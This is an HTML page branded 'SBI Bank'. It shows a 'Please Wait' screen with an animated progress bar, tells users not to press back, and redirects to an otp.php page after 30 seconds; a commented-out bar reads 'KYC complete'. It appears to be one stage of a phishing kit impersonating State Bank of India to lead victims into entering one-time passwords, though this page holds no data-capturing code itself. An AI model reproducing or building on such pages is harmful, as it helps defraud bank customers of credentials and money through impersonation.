<!DOCTYPE html>
<html lang="en">
<head>
  <title>SBI Bank</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>


<head>
<meta
http-equiv="Content-Language"
content="fr">
<meta
http-equiv="refresh"
content="30;
URL=otp.php">
<!---
Redirection
vers
page_suivante.php
après
un
délai
de
5
secondes
durant
lesquelles
la
page
actuelle
(page_premiere.php,
par
exemple)
est
affichée
-->
</head>



<body onload="move()">

<div class="container">
  
<div> <img
src="otp-header1.jpg"
style="width:
100%;
padding-bottom:
0px
!important;"> </div>
<div
style="text-align:center">
<h3><font
color="#3399FF">Please Wait...</h3>
<div>
  <div>
<br>
<h4><font
color="#00802b"><p>Don't Press Back or refresh while processing ..</p></h4>

</div>
  <style>
#myProgress {
  width: 100%;
  background-color: #ddd;
}

#myBar {
  width: 1%;
  height: 20px;
  background-color: #3396FF;
}
</style>
<div id="myProgress">
  <div id="myBar"></div>
</div>

<br>
  <script>
var i = 0;
function move() {
  if (i == 0) {
    i = 1;
    var elem = document.getElementById("myBar");
    var width = 1;
    var id = setInterval(frame, 300);
    function frame() {
      if (width >= 100) {
        clearInterval(id);
        i = 0;
      } else {
        width++;
        elem.style.width = width + "%";
      }
    }
  }
}
</script>

</div>






<!--   <div class="progress">
    <div class="progress-bar progress-bar-striped active" role="progressbar" aria-valuenow="35" aria-valuemin="0" aria-valuemax="100" style="width:35%">
    KYC complete 35%
    </div> -->
  </div>
</div>

</body>
</html>
